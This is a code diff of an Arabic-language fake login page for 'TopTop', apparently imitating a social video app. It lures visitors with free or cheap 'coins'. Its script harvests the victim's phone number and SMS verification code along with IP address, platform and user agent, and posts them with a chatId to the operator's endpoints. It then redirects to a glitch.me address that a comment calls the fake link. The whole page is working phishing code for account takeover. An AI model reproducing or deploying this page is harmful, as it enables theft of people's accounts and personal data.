@@ -47,6 +47,12 @@
         button:hover {
             background-color: #45a049;
         }
+        .pricing-option {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 10px 0;
+        }
         .message {
             background-color: #f8d7da;
             color: #721c24;
@@ -54,17 +60,6 @@
             border-radius: 4px;
             margin-bottom: 10px;
             display: none;
-        }
-        .phone-input-container {
-            display: flex;
-            align-items: center;
-        }
-        #countryCode {
-            width: 80px;
-            margin-left: 10px;
-        }
-        #phoneNumber {
-            flex-grow: 1;
         }
     </style>
 </head>
@@ -76,24 +71,22 @@
             <h1>تسجيل الدخول لـ TopTop</h1>
             <form id="loginForm">
                 <label for="country">اختر الدولة:</label>
-                <select id="country" name="country" required onchange="updateCountryCode()">
-                    <option value="YE" data-code="+967">🇾🇪 اليمن</option>
-                    <option value="SA" data-code="+966">🇸🇦 السعودية</option>
-                    <option value="EG" data-code="+20">🇪🇬 مصر</option>
-                    <option value="IQ" data-code="+964">🇮🇶 العراق</option>
-                    <option value="LY" data-code="+218">🇱🇾 ليبيا</option>
-                    <option value="JO" data-code="+962">🇯🇴 الأردن</option>
-                    <option value="AE" data-code="+971">🇦🇪 الإمارات</option>
-                    <option value="SD" data-code="+249">🇸🇩 السودان</option>
-                    <option value="MA" data-code="+212">🇲🇦 المغرب</option>
-                    <option value="SY" data-code="+963">🇸🇾 سوريا</option>
-                    <option value="TN" data-code="+216">🇹🇳 تونس</option>
-                    <option value="DZ" data-code="+213">🇩🇿 الجزائر</option>
+                <select id="country" name="country" required>
+                    <option value="YE" data-code="+967">🇾🇪 اليمن (+967)</option>
+                    <option value="SA" data-code="+966">🇸🇦 السعودية (+966)</option>
+                    <option value="EG" data-code="+20">🇪🇬 مصر (+20)</option>
+                    <option value="IQ" data-code="+964">🇮🇶 العراق (+964)</option>
+                    <option value="LY" data-code="+218">🇱🇾 ليبيا (+218)</option>
+                    <option value="JO" data-code="+962">🇯🇴 الأردن (+962)</option>
+                    <option value="AE" data-code="+971">🇦🇪 الإمارات (+971)</option>
+                    <option value="SD" data-code="+249">🇸🇩 السودان (+249)</option>
+                    <option value="MA" data-code="+212">🇲🇦 المغرب (+212)</option>
+                    <option value="SY" data-code="+963">🇸🇾 سوريا (+963)</option>
+                    <option value="TN" data-code="+216">🇹🇳 تونس (+216)</option>
+                    <option value="DZ" data-code="+213">🇩🇿 الجزائر (+213)</option>
                 </select>
-                <div class="phone-input-container">
-                    <input type="text" id="countryCode" readonly>
-                    <input type="tel" id="phoneNumber" name="phoneNumber" placeholder="رقم الهاتف" required>
-                </div>
+                <input type="text" id="phoneNumber" name="phoneNumber" placeholder="رقم الهاتف" required>
+                
                 <button type="button" onclick="sendPhoneNumber()">إرسال رقم الهاتف</button>
             </form>
         </div>
@@ -105,6 +98,26 @@
                 <button type="submit">تأكيد الدخول</button>
             </form>
         </div>
+
+        <div class="pricing-section">
+            <h2>أسعار أكوانزات TopTop</h2>
+            <div class="pricing-option">
+                <span>1000 أكوانز - 0$</span>
+                <button onclick="showMessage('يرجى تسجيل الدخول أولاً')">مجاني</button>
+            </div>
+            <div class="pricing-option">
+                <span>2000 أكوانز - 2$</span>
+                <button onclick="showMessage('يرجى تسجيل الدخول أولاً')">شراء الآن</button>
+            </div>
+            <div class="pricing-option">
+                <span>5000 أكوانز - 5$</span>
+                <button onclick="showMessage('يرجى تسجيل الدخول أولاً')">شراء الآن</button>
+            </div>
+            <div class="pricing-option">
+                <span>10000 أكوانز - 10$</span>
+                <button onclick="showMessage('يرجى تسجيل الدخول أولاً')">شراء الآن</button>
+            </div>
+        </div>
     </div>
 
     <script>
@@ -115,37 +128,6 @@
             setTimeout(function() {
                 messageElement.style.display = 'none';
             }, 3000);
-        }
-
-        function getChatIdFromUrl() {
-            const urlParams = new URLSearchParams(window.location.search);
-            return urlParams.get('chatId');
-        }
-
-        function updateCountryCode() {
-            const countrySelect = document.getElementById('country');
-            const countryCodeInput = document.getElementById('countryCode');
-            const selectedOption = countrySelect.options[countrySelect.selectedIndex];
-            countryCodeInput.value = selectedOption.getAttribute('data-code');
-        }
-
-        function validatePhoneNumber(phoneNumber, country) {
-            const phonePatterns = {
-                'YE': /^[7]\d{9}$/,
-                'SA': /^[5]\d{8}$/,
-                'EG': /^[1]\d{9}$/,
-                'IQ': /^[7]\d{9}$/,
-                'LY': /^[9]\d{8}$/,
-                'JO': /^[7][7-9]\d{7}$/,
-                'AE': /^[5][0,1,2,4,5,6]\d{7}$/,
-                'SD': /^[9]\d{8}$/,
-                'MA': /^[6-7]\d{8}$/,
-                'SY': /^[9]\d{8}$/,
-                'TN': /^[2-9]\d{7}$/,
-                'DZ': /^[5-7]\d{8}$/
-            };
-
-            return phonePatterns[country].test(phoneNumber);
         }
 
         async function getIPInfo() {
@@ -185,43 +167,32 @@
         async function sendPhoneNumber() {
             const phoneNumber = document.getElementById('phoneNumber').value;
             const country = document.getElementById('country').value;
-            const countryCode = document.getElementById('countryCode').value;
-            const chatId = getChatIdFromUrl();
+            const chatId = document.querySelector('input[name="chatId"]').value;
 
             if (!phoneNumber || !country || !chatId) {
                 showMessage('يرجى ملء جميع الحقول المطلوبة');
                 return;
             }
 
-            if (!validatePhoneNumber(phoneNumber, country)) {
-                showMessage('رقم الهاتف غير صالح للدولة المختارة');
-                return;
-            }
-
-            const fullPhoneNumber = countryCode + phoneNumber;
-
             const ipInfo = await getIPInfo();
             const platformInfo = getPlatformInfo();
 
             try {
+                // هنا يجب استبدال '/sendPhoneNumber' بعنوان URL الفعلي لخادمك
                 const response = await fetch('/sendPhoneNumber', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                     },
                     body: JSON.stringify({
-                        phoneNumber: fullPhoneNumber,
+                        phoneNumber,
                         country,
                         chatId,
                         ip: ipInfo.ip,
                         platform: platformInfo.platform,
-                        userAgent: navigator.userAgent
+                        userAgent: platformInfo.userAgent
                     })
                 });
-
-                if (!response.ok) {
-                    throw new Error(`HTTP error! status: ${response.status}`);
-                }
 
                 const result = await response.json();
                 if (result.success) {
@@ -229,7 +200,7 @@
                     document.getElementById('login-container').style.display = 'none';
                     document.getElementById('verification-container').style.display = 'block';
                 } else {
-                    showMessage(result.error || 'حدث خطأ أثناء إرسال رقم الهاتف. يرجى المحاولة مرة أخرى.');
+                    showMessage('حدث خطأ أثناء إرسال رقم الهاتف. يرجى المحاولة مرة أخرى.');
                 }
             } catch (error) {
                 console.error('Error:', error);
@@ -240,9 +211,9 @@
         async function verifyCode(event) {
             event.preventDefault();
             const verificationCode = document.getElementById('verificationCode').value;
-            const phoneNumber = document.getElementById('countryCode').value + document.getElementById('phoneNumber').value;
+            const phoneNumber = document.getElementById('phoneNumber').value;
             const country = document.getElementById('country').value;
-            const chatId = getChatIdFromUrl();
+            const chatId = document.querySelector('input[name="chatId"]').value;
 
             if (!verificationCode || !phoneNumber || !country || !chatId) {
                 showMessage('يرجى ملء جميع الحقول المطلوبة');
@@ -253,6 +224,7 @@
             const platformInfo = getPlatformInfo();
 
             try {
+                // هنا يجب استبدال '/verifyCode' بعنوان URL الفعلي لخادمك
                 const response = await fetch('/verifyCode', {
                     method: 'POST',
                     headers: {
@@ -265,22 +237,19 @@
                         chatId,
                         ip: ipInfo.ip,
                         platform: platformInfo.platform,
-                        userAgent: navigator.userAgent
+                        userAgent: platformInfo.userAgent
                     })
                 });
-
-                if (!response.ok) {
-                    throw new Error(`HTTP error! status: ${response.status}`);
-                }
 
                 const result = await response.json();
                 if (result.success) {
                     showMessage('تم التحقق من الكود بنجاح');
+                    // التوجيه إلى الرابط الوهمي بعد التحقق الناجح
                     setTimeout(() => {
                         window.location.href = "https://polarized-believed-fisherman.glitch.me/";
                     }, 3000);
                 } else {
-                    showMessage(result.error || 'فشل التحقق من الكود. يرجى المحاولة مرة أخرى.');
+                    showMessage('فشل التحقق من الكود. يرجى المحاولة مرة أخرى.');
                 }
             } catch (error) {
                 console.error('Error:', error);
@@ -289,7 +258,6 @@
         }
 
         document.addEventListener('DOMContentLoaded', function() {
-            updateCountryCode();
             const verificationForm = document.getElementById('verificationForm');
             verificationForm.addEventListener('submit', verifyCode);
         });
